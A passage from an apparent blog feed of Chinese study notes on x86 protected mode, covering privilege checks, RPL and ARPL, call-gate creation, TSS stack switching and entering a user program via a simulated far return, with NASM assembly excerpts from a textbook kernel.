= 3</strong>，调用门中的<strong>DPL = 3</strong>，内核代码段的<strong>DPL = 0</strong>，满足条件可以执行转移。转移之后处理器以<strong>CPL = 0</strong>特权级执行</li><li>在内核的硬盘读写例程中将数据段的选择子传送给DS，需要进行特权级检查，由高特权级高特权级的代码段可以访问低特权级或同级的数据段，在本程序中硬盘读写例程中<strong>CPL = 0</strong> ≤ 用户程序数据段的<strong>DPL = 3</strong>，即满足条件通过检查。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/838c8deb87ba21672c488901d70d756c.png" class="">若用户程序通过调用门执行内核的硬盘的读写例程时传递的<strong>数据段选择子是内核数据段选择子</strong>，那么在将数据段选择子传递给DS时也可以通过检查，那么用户程序就可以通过调用门破坏内核数据段了。</li></ol><p>说明只是依靠<strong>当前代码段特权级CPL</strong>和<strong>目标数据段描述符特权级DPL</strong>进行特权级检查时不够充分的。</p><p>在这里要访问数据段的是用户程序，用户程序自己不能访问外部设备，它需要通过请求内核硬盘读写例程去访问一个数据段，在内核硬盘读写例程中当前<strong>CPL = 0</strong>，之前是3，说明请求者的信息被隐藏了。</p><p>如果能够恢复请求者身份，知道它是3级特权的用户程序，就能够知道不允许它去访问<strong>0特权级</strong>的内核数据段，将内核数据段选择子传递到DS的请求也就不可能执行，这个问题不能只靠处理器来解决。</p><p>在访问一个数据段之前，需要将段选择子传送到DS的段选择器，在进行这个操作时进行特权级检查<br>段选择子：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b15db26cb1d6aca2e7c439c29bf7778e.png" class=""><p>其中RPL（Request Privilege Level）表示请求者的特权级，那么检查如下：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/33bcf125a7d94c25d79aef9e8646da2e.png" class=""><p>对于RPL的检查已经内置到处理器中，由处理器固件完成的是一个例行的操作。因此当程序员意识到请求着不是当前程序或当前代码段，而是一个低特权级的程序，那么在硬盘读写例程中：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/4119cb107ccd78184897262995691708.png" class=""><p>此时就可以检查出请求者的特权级RPL低于内核数据段特权级DPL，在数值上有<strong>RPL = 3 ≥ DPL = 0</strong>，不满足条件，指令终止处理器产生一个异常中断。</p><h2 id="09-请求特权级调整指令ARPL"><a href="#09-请求特权级调整指令ARPL" class="headerlink" title="09. 请求特权级调整指令ARPL"></a>09. 请求特权级调整指令ARPL</h2><p>在程序中：</p><pre><code class="assembly">;-------------------------------------------------------------------------------    ;此例程用于说明如何通过请求特权级RPL解决因请求者身份与CPL不同而带来的安全问题    read_hard_disk_with_gate:;从硬盘读取一个逻辑扇区                                    ;输入：PUSH 逻辑扇区号                                    ;      PUSH 目标缓冲区所在段的选择子                                    ;      PUSH 目标缓冲区在段内的偏移量                                    ;返回：无    push eax    push ebx    push ecx        mov ax,[esp+0x10];获取调用者的CS    arpl [esp+0x18],ax              ;将数据段选择子调整到真实的请求特权级别    mov ds,[esp+0x18]               ;用真实的段选择子加载段寄存器DS        mov eax,[esp+0x1c]              ;从栈中取得逻辑扇区号    mov ebx,[esp+0x14]              ;从栈中取得缓冲区在段内的偏移量        ;此部分的功能是读硬盘，并传送到缓冲区，予以省略。        retf 12</code></pre><p>假定已经为这个例程创建调用门，调用门的特权级是3，这个例程可以从特权级3的用户程序调用。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/30e1a68b76aac209728ae085a24b8ea0.png" class=""><p>在CS的低2位就是进入当前例程前请求者的特权级，将其取出传送给数据段选择子的RPL字段，即可修改请求者的特权级。使用ARPL指令修改。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/22c1deda038e307144472e86469a1c6c.png" class=""><p>ARPL指令比较两个操作数的低2位，若<strong>目的操作数RPL</strong> &lt; <strong>源操作数RPL</strong>，则修改目的操作数的RPL，使其与源操作数RPL保持一致，同时标志寄存器的0标志位<strong>ZF = 1</strong>。否则不改变目的操作数的RPL，标志寄存器的0标志位<strong>ZF清零</strong>。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/e604325a309c96f47dd42c8c2e3bd8c7.png" class=""><p>代码最后，指令<strong>retf 12</strong>表示由被调用者来保持堆栈平衡，传入三个参数，一个参数4个字节，共12个字节。</p><h2 id="10-一般情况下的请求特权级设置"><a href="#10-一般情况下的请求特权级设置" class="headerlink" title="10. 一般情况下的请求特权级设置"></a>10. 一般情况下的请求特权级设置</h2><p>绝大多数时候，请求者就是当前代码段或者当前程序，此时只需要将段选择子的RPL设置成当前当前特权级CPL就可以了。<br><mark>c13_mbr0.asm</mark>程序中：</p><pre><code class="assembly">         ;以下进入保护模式... ...         jmp dword 0x0010:flush             ;16位的描述符选择子：32位偏移                                            ;清流水线并串行化处理器  </code></pre><ol><li>此时当前特权级<strong>CPL为0</strong>，是从实模式继承来的；</li><li>请求特权级<strong>RPL</strong>位于选择子<mark>0x0010 = 0000000000010_0_00</mark>中，其中<strong>RPL = 0</strong>；</li><li>转移的目标位置是初始代码段，其中DPL为00。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/49141991bb016a8848bfa17c75991426.png" class="">因此在此条指令执行时，<strong>CPL = RPL = DPL</strong>，可以通过特权级检查。</li></ol><p>进入保护模式设置数据段：</p><pre><code class="assembly">    mov eax, 0x0008;0x0008 = 0000000000001_0_00     mov ds, eax</code></pre><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/32983c8cc1a5e803ea6bf07aac2c1d15.png" class=""><ol><li>此时<strong>CPL = 0</strong>；</li><li>请求特权级在选择子<strong>0x0008</strong>，即请求特权级<strong>RPL = 0</strong>；</li><li>目标数据段是4G字节数据段，其中描述符<strong>DPL = 0</strong>;<br>能够通过特权级检查</li></ol><p>接下来设置栈段：</p><pre><code class="assembly">    mov eax,0x0018                      ;加载堆栈段选择子 11：00011_0_00    mov ss,eax    xor esp,esp                         ;堆栈指针 &lt;- 0 </code></pre><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/23e9f4fd8b39015b6e7e6e5c8528b1ee.png" class=""><ol><li>此时CPL = 0；</li><li>请求特权级在选择子0x0018，即请求特权级RPL = 0；</li><li>目标数据段是栈段，其描述符中DPL = 0；</li><li>能够通过特权级检查</li></ol><h2 id="11-为内核接口例程创建调用门"><a href="#11-为内核接口例程创建调用门" class="headerlink" title="11. 为内核接口例程创建调用门"></a>11. 为内核接口例程创建调用门</h2><p>进入内核之后使用指令<strong>call sys_routing_seg_sel:put_string</strong>在内核中转移是允许的，因为<strong>内核公共例程段的特权级</strong>和<strong>内核代码段的特权级</strong>是相同的，都是0特权级可以直接调用。但是用户程序的特权级是3，所以要为那些提供给用户程序使用的例程创建调用门。</p><p>在内核的核心数据段中定义了符号地址检索表，其中有例程的名字，例程所在段的段内偏移，例程所在段的段内选择子。现在分别为这些例程创建调用门，并且把它们<strong>例程所在段选择子</strong>改为<strong>调用门选择子</strong>。</p><p>创建调用门的代码如下：</p><pre><code class="assembly">         ;以下开始安装为整个系统服务的调用门。特权级之间的控制转移必须使用门         mov edi,salt                       ;C-SALT表的起始位置         mov ecx,salt_items                 ;C-SALT表的条目数量  .b3:         push ecx         mov eax,[edi+256]                  ;该条目入口点的32位偏移地址         mov bx,[edi+260]                   ;该条目入口点的段选择子         mov cx,1_11_0_1100_000_00000B      ;特权级3的调用门(3以上的特权级才                                            ;允许访问)，0个参数(因为用寄存器                                            ;传递参数，而没有用栈)         call sys_routine_seg_sel:make_gate_descriptor         call sys_routine_seg_sel:set_up_gdt_descriptor         mov [edi+260],cx                   ;将返回的门描述符选择子回填，此时默认RPL=0         add edi,salt_item_len              ;指向下一个C-SALT条目         pop ecx         loop .b3</code></pre><p>其中调用门描述符：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/6518feaecf9fc62d080fc0d091355ed0.png" class=""><p>安装调用门之后的GDT布局：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/7ae4d92e523e91c9d13143d5d81db293.png" class=""><h2 id="12-调用门测试和调用门转移过程"><a href="#12-调用门测试和调用门转移过程" class="headerlink" title="12. 调用门测试和调用门转移过程"></a>12. 调用门测试和调用门转移过程</h2><p>接上一节，本节对代码段进行测试：</p><pre><code class="assembly">    ;对门进行测试    mov ebx,message_2    call far [salt_1+256];通过门显示信息(偏移量将被忽略)                                        ;此时DS指向内核数据段        mov ebx,message_3    call sys_routine_seg_sel:put_string ;在内核中调用例程不需要通过门</code></pre><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/528c93b00b480f0755db858e7019c86b.png" class=""><ol><li>DS是指向内核数据段，偏移<strong>salt_1+256</strong>指向一个地址，地址处存放的是一个偏移和一个选择子；</li><li>处理器使用段选择子到GDT中取出描述符，发现是一个调用门描述符，包含一个代码段选择子和段内偏移；</li><li>处理器将代码段选择子传送到CS的段选择器部分，将段内偏移传送到EIP；</li><li>处理器使用CS段选择器中的选择子访问GDT，将取出的描述符存放到CS描述符高速缓存器；</li><li>处理器使用CS描述符高速缓存器加上EIP中的偏移转移到目标例程开始执行</li></ol><p>在这里<strong>salt_1+256</strong>地址处指定的偏移量和选择子中，只是使用了选择子部分。即再通过调用门实施控制转移时，在指令中提供的偏移量会被忽略。但是在指令中偏移量还是要加上。如下：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/de2084be174908ddc891a44709eb349d.png" class=""><p>若0x0030指定的选择子是一个调用门，那么指令中指定的偏移量0x0000C000不会被使用，但是在书写时不能不写，但是可以写一个任意值。</p><p>通过调用门实施控制转移时的特权级检查</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b9122dfea493ddd6e1e01d87931ce2ac.png" class=""><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a51b09bd9abd495fbb26d503615fbe12.png" class=""><h2 id="13-通过调用门实施由低特权级到高特权级的转移"><a href="#13-通过调用门实施由低特权级到高特权级的转移" class="headerlink" title="13. 通过调用门实施由低特权级到高特权级的转移"></a>13. 通过调用门实施由低特权级到高特权级的转移</h2><p>接上一节，本节具体看代码<strong>c14_core2.asm</strong></p><p>其中用户程序调用内核例程和过程：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/e30802c6c987a49c9a97e3b200122cc7.png" class=""><p>特权级检查：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/36e7df3cf593f7328368b76a0c077619.png" class=""><h2 id="14-通过调用门转移控制时的栈切换过程"><a href="#14-通过调用门转移控制时的栈切换过程" class="headerlink" title="14. 通过调用门转移控制时的栈切换过程"></a>14. 通过调用门转移控制时的栈切换过程</h2><p>用<strong>CALL</strong>指令通过调用门实施控制转移可以改变程序的当前特权级<strong>CPL</strong>。比如从用户程序的3特权级用call指令通过调用门进入内核程序后，当前的CPL也会变为0特权级。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/19dfe1105f0d2f3c98eb7c2c64c36496.png" class=""><p>问题在于通过调用门转移的时候，栈的切换时处理器自动进行的，那么处理器是如何知道应该切换到哪一个栈，又是如何知道栈在哪里的呢。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/9e54f5e4a7b6a8667a36e1ea17b856d7.png" class=""><p>TSS中没有保存3特权级栈段选择子和栈指针时因为通过调用门转移时，是从低特权级转移到高特权级中，特权级3是最低的，不可能从更低的特权级转移到3特权级中了，所以TSS中也就不需要存储特权级3的栈段选择子和栈指针。</p><p>在用户程序中：</p><pre><code class="assembly">         mov eax,100                         ;逻辑扇区号100         mov ebx,buffer                      ;缓冲区偏移地址         call far [fs:ReadDiskData]          ;段间调用 </code></pre><p><strong>call far</strong>指令执行时，当前CPL = 3，目标例程位于内核的公共例程段，内核的公共例程段的特权级DPL = 0，因此进入目标例程时需要对栈进行切换。</p><p>切换之前的栈时用户程序自己的栈，若转移之前需要通过栈传递参数则存在用户程序自己的栈中，此处并未使用栈传递参数，而是通过寄存器传递参数。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a0bc603ee99aac03173c64f016e9e70a.png" class=""><ol><li>一旦处理器发现特权级更改就要对栈进行切换，而目标代码段的特权级是0；</li><li>然后立即到当前任务的TSS中，取出特权级0的栈段选择子<strong>SS0</strong>、和栈指针<strong>EIP0</strong>；</li><li>分别传送到栈段寄存器<strong>SS</strong>和栈指针寄存器<strong>ESP</strong>；</li><li><strong>SS</strong>的段选择器部分发生改变后，处理器立即根据段选择子到GDT/LDT中取出描述符</li><li>将取出的描述符传送到<strong>SS</strong>描述符高速缓存器中，这样新的栈段就可以使用了。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/74e528f9b31450fde9a622b1a75eece1.png" class="">切换到新栈之后，处理器立即压入旧栈的<strong>SS和ESP</strong>，这样做是为了当从调用门返回时，可以返回到用户程序原来自己的栈中。其中段选择子是16位的，压入时使用<strong>movsz</strong>指令0扩展至32位。接着处理器将旧栈中的参数传递到新栈中（参数个数记录在调用门描述符高32位的0~4)。因为在这个调用中使用的是寄存器传参，所以这里参数部分是没有的。</li></ol><p>复制完参数之后，处理器再将控制转移前的CS和EIP压栈，这样做是为了能够返回到原来的程序，也就是调用者那里。</p><p>栈切换的过程是由处理器自动进行的，现在处理器就可以执行目标例程了。</p><p>当例程返回时：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b1176d3ad6fdd9933abe8488ad1f2858.png" class=""><p>从被调用程序的栈中返回<strong>SS、ESP、CS、EIP</strong>，如此一来就可以返回到原来的调用者那里去执行原来的程序，并切换回原来的旧栈。</p><h2 id="15-通过调用门转移控制并返回的完整描述"><a href="#15-通过调用门转移控制并返回的完整描述" class="headerlink" title="15. 通过调用门转移控制并返回的完整描述"></a>15. 通过调用门转移控制并返回的完整描述</h2><p>通过调用门转移控制并返回的全过程：<br>使用<strong>call far</strong>指令通过调用门转移控制时，如果改变了当前的特权级别则必须切换栈，即从当前任务的固有栈切换到切换到与目标代码段相同特权级别的栈上。</p><p>栈的切换是由处理器固件自动进行的，当前栈是由<strong>SS和ESP</strong>的当前内容指示的，要切换到的新栈位于当前任务的<strong>TSS</strong>中，处理器知道如何找到它。在栈切换前处理器要检查新栈是否有足够的空间完成本次控制转移。</p><p>控制转移和栈切换的过程如下：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/f7134a3acce2a32acee54711ec2cb469.png" class=""><p>如果调用门的控制转移是由<strong>jmp far</strong>指令发起的，则转移后不再返回，而且没有特权级的变化就不需要切换栈；<br>相反，如果调用门的控制转移是由<strong>call far</strong>指令发起的，那么可以使用远转移指令<strong>retf</strong>返回到调用者。</p><p>返回时，处理器从栈中弹出调用者的<strong>代码段选择子</strong>和<strong>指令指针</strong>，不管是从相同的特权级还是从不同的特权级返回，为了安全处理器都会进行特权级检查，控制返回的全过程如下：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/0df927207154745600b71a08826ebcc2.png" class=""><p>特权级检查不是在实际访问时进行的，而是在将段选择子带入寄存器时进行的，因此当控制低特权级的段通过调用门进入高特权级的段之后，假如高特权级的段使用指令<strong>mov ds, …</strong> 将一个高特权级的数据段选择子带入DS时，如果能够通过特权级检查时没有问题的。</p><p>在返回第特权级的段后，低特权级的程序依然能够使用指令<mark>mov [xx], xx</mark>来访问高特权级的数据段，而不会进行任何检查，这是很危险的。为了解决这个问题，在执行<strong>retf</strong>时处理器要检查数据段寄存器，根据他们找到相应的段描述符，要是有任意一个段描述符的DPL高于调用者的特权级也就是返回后的新CPL，那么处理器将会把数值0传送到该段寄存器的段选择器中（0是一个特殊的段选择子，处理器允许传入而且不会引发任何异常），但是后续使用这样的段选择器访问内存时一定会引发处理器异常中断。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/44f4a1e4fc015ba16294623f907c5a4d.png" class=""><p>TSS中的SS0、ESP0等是静态的，除非软件修改它们，处理是不会修改它们的。当处理器通过调用门进入特权级0的代码段时，处理器会使用SS0和ESP0切换到特权级0的栈段，在此之后栈指针可能会因为压栈出栈而改变，但是返回时并不会更新到TSS中的ESP0，下次通过调用门进入特权级0的代码段时，用的依然是静态的ESP0的值。</p><h2 id="16-创建0、1、2特权级的栈并登记在TSS中"><a href="#16-创建0、1、2特权级的栈并登记在TSS中" class="headerlink" title="16. 创建0、1、2特权级的栈并登记在TSS中"></a>16. 创建0、1、2特权级的栈并登记在TSS中</h2><p>上一节介绍了通过调用门转移控制和返回的全过程，据此知道必须要创建<strong>特权级为0、1、2</strong>的栈段，并登记在当前任务的任务状态段<strong>TSS</strong>中，对于每一个栈包括栈的线性基地址、栈段选择子、初始栈指针。先把这些信息保存到TCB最后再来填写TSS。</p><p>在<strong>load_relocate_program</strong>程序中，处理完SALT之后，从栈中取得TCB的线性基地址，之后就可以创建0、1、2特权级的栈段了：</p><pre><code class="assembly">    mov esi,[ebp+11*4]                  ;从堆栈中取得TCB的基地址        ;创建0特权级栈    mov ecx,0                           ;以4KB为单位的栈段界限值    mov [es:esi+0x1a],ecx               ;登记0特权级栈界限到TCB    inc ecx    shl ecx,12                          ;乘以4096，得到段大小    push ecx    call sys_routine_seg_sel:allocate_memory    mov [es:esi+0x1e],ecx               ;登记0特权级栈基地址到TCB    mov eax,ecx    mov ebx,[es:esi+0x1a]               ;段长度（界限）    mov ecx,0x00c09200                  ;4KB粒度，读写，特权级0    call sys_routine_seg_sel:make_seg_descriptor    mov ebx,esi                         ;TCB的基地址    call fill_descriptor_in_ldt    ;or cx,0000_0000_0000_0000          ;设置选择子的特权级为0    mov [es:esi+0x22],cx                ;登记0特权级堆栈选择子到TCB    pop dword [es:esi+0x24]             ;登记0特权级堆栈初始ESP到TCB                                        ;对于一个向上扩展的栈；来说，初始栈指针                                        ;应该设置成栈的总大小</code></pre><p>创建<strong>0、1、2特权级栈</strong>之后任务控制块<strong>TCB的结构如下</strong>：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/9ab26e5173251877414c71dac2562ea7.png" class=""><p>创建完<strong>3个特权级栈</strong>之后，先创建<strong>LDT</strong>描述符，并将其安装在<strong>GDT</strong>中，之后创建任务状态段<strong>TSS</strong>。</p><pre><code class="assembly">    ;在GDT中登记LDT描述符    mov eax,[es:esi+0x0c]              ;LDT的起始线性地址    movzx ebx,word [es:esi+0x0a]       ;LDT段界限    mov ecx,0x00008200                 ;LDT描述符，特权级0    call sys_routine_seg_sel:make_seg_descriptor    call sys_routine_seg_sel:set_up_gdt_descriptor    mov [es:esi+0x10],cx               ;登记LDT选择子到TCB中        ;创建用户程序的TSS    mov ecx,104                        ;tss的基本尺寸    mov [es:esi+0x12],cx                  dec word [es:esi+0x12]             ;登记TSS界限值到TCB     call sys_routine_seg_sel:allocate_memory    mov [es:esi+0x14],ecx              ;登记TSS基地址到TCB</code></pre><p>之后从TCB中取出<strong>0、1、2</strong>三个特权级的栈段选择子和栈指针，并填写到<strong>TSS</strong>中：</p><pre><code class="assembly">    ;登记基本的TSS表格内容    mov edx,[es:esi+0x24]              ;登记0特权级栈初始ESP    mov [es:ecx+4],edx                 ;到TSS中        mov dx,[es:esi+0x22]               ;登记0特权级栈段选择子    mov [es:ecx+8],dx                  ;到TSS中        mov edx,[es:esi+0x32]              ;登记1特权级栈初始ESP    mov [es:ecx+12],edx                ;到TSS中        mov dx,[es:esi+0x30]               ;登记1特权级栈段选择子    mov [es:ecx+16],dx                 ;到TSS中        mov edx,[es:esi+0x40]              ;登记2特权级栈初始ESP    mov [es:ecx+20],edx                ;到TSS中        mov dx,[es:esi+0x3e]               ;登记2特权级栈段选择子    mov [es:ecx+24],dx                 ;到TSS中        mov dx,[es:esi+0x10]               ;登记任务的LDT选择子    mov [es:ecx+96],dx                 ;到TSS中        mov word [es:ecx+100],0            ;T=0</code></pre><p>之后就是创建<strong>TSS</strong>描述符，并在GDT中登记TSS描述符：</p><pre><code class="assembly">    ;在GDT中登记TSS描述符    mov eax,[es:esi+0x14]              ;TSS的起始线性地址    movzx ebx,word [es:esi+0x12]       ;段长度（界限）    mov ecx,0x00008900                 ;TSS描述符，特权级0    call sys_routine_seg_sel:make_seg_descriptor    call sys_routine_seg_sel:set_up_gdt_descriptor    mov [es:esi+0x18],cx               ;登记TSS选择子到TCB</code></pre><p>之后就是<mark>ret 8</mark>指令返回到调用者。</p><h2 id="17-通过模拟调用门返回进入用户程序执行"><a href="#17-通过模拟调用门返回进入用户程序执行" class="headerlink" title="17. 通过模拟调用门返回进入用户程序执行"></a>17. 通过模拟调用门返回进入用户程序执行</h2><p>接上一节，返回到内核<strong>start</strong>调用者之后，加载任务寄存器<strong>TR</strong>以及局部描述符表寄存器<strong>LDTR</strong>：</p><pre><code class="assembly">    ltr [ecx+0x18];加载任务状态段    lldt [ecx+0x10];加载LDT</code></pre><p>这两条指令执行之后表明当前正在一个任务中执行，现在是在任务的全局部分执行，并且应该转移到任务的私有部分（用户程序）执行。</p><p>在用户程序中每个段的描述符特权级<strong>DPL = 3</strong>，以前使用<strong>jmp</strong>指令完成转移，但是当前程序特权级CPL = 0，从高特权级使用<strong>jmp</strong>或<strong>call</strong>指令转移到低特权级时不被允许的。</p><p>通过模拟从调用门返回进入低特权级的用户程序中执行，在栈中压入以下部分：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a23d6b3e8979060aa4a9cb178e98a27f.png" class=""><p>代码如下：</p><pre><code class="assembly">    mov ds,[ecx+0x44];切换到用户程序头部段                            ;使用DS取得数据，之后再回头修改DS        ;以下假装是从调用门返回。摹仿处理器压入返回参数    push dword [0x1c];调用前的堆栈段选择子    push dword 0;调用前的esp        push dword [0x0c];调用前的代码段选择子    push dword [0x08];调用前的eip        retf</code></pre><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/494eeae03df39fb176ef1babebb7c9b7.png" class=""><p>之后进入用户程序执行，执行完成之后返回：</p><pre><code class="assembly">        jmp far [fs:TerminatePorgram];将控制权返回到系统</code></pre><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/36523565de8778222c076fd55ab5ccaa.png" class=""><p>但是<strong>jmp</strong>执行时，<strong>CPL = 3，DPL = 0</strong>，条件不成立，不能使<strong>jmp</strong>指令返回，这里改成<strong>call far</strong>即可，不过<strong>call</strong>指令会在栈中压入返回地址。不过在用户程序终止后，其占用的资源都会被回收，包括栈段，这种情况下压入数据和不压入数据是一样的。</p><p>Virtual Box运行：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/019882c53d7533d421d43dc588d91283.png" class=""><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/f0955c31ac0d10e20deec392c7112361.png" class=""><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/0b667250859c67753ffa8d22eea56c58.png" class="">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>27. 任务和任务的创建</title>
      <link href="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/"/>
      <url>/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="01-任务：概念和组成"><a href="#01-任务：概念和组成" class="headerlink" title="01. 任务：概念和组成"></a>01. 任务：概念和组成</h2><p>内核时对整个计算机系统进行管理，管理软件和硬件。内核可以加载用户程序，对用户程序进行重定位，用户程序终止后还可以回收用户程序的资源，在编程时位用户程序提供API。</p><span id="more"></span><p>将内核和用户程序可以看作一个整体：任务</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e96a335381e80d83917a5b98fe09493f.png" class=""><p>在一个系统中只有一个内核，但可以有多个用户程序，即多任务系统。</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1e64220c81caf3726dd50fce7fc21cf1.png" class=""><p>GDT存放内核中的描述符，LDT存放每个任务中用户程序的描述符：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1b0bd96b722758508e4edac8c83acde7.png" class=""><p>每个任务还需要一个任务状态段：<mark>TSS（Task Status Segment)</mark>。</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/bc6f1d19eff4c8baa3afc8c26a8196fe.png" class=""><h2 id="02-使用任务控制块保存任务的基本信息"><a href="#02-使用任务控制块保存任务的基本信息" class="headerlink" title="02. 使用任务控制块保存任务的基本信息"></a>02. 使用任务控制块保存任务的基本信息</h2><p>本节主要介绍了本章程序的结构，主要结构如下，本章程序有三个</p><ul><li>用户程序：<strong>c13_app1.asm</strong><ol><li>用户头部段</li><li>用户数据段</li><li>用户栈段</li><li>用户代码段</li><li>用户尾部段</li></ol></li><li>内核程序：<strong>c14_core.asm</strong><ol><li>定义常量存放选择子</li><li>内核程序头部段</li><li>内核公共例程段，就是一些例程和以前一样</li><li>内核数据段，一些文本信息、<mark>SALT</mark>等</li><li>内核代码段，有内核入口点<mark>start</mark>、创建任务控制块<mark>TCB（Task Control Block）</mark>记录任务的信息</li><li>内核尾部段</li></ol></li><li>引导程序：<strong>c13_mbr0.asm</strong><ol><li>创建必要的段描述符</li><li>进入保护模式</li><li>加载内核</li><li>创建内核的段描述符</li><li>使用<mark>jmp far</mark> 指令跳转执行内核</li></ol></li></ul><h2 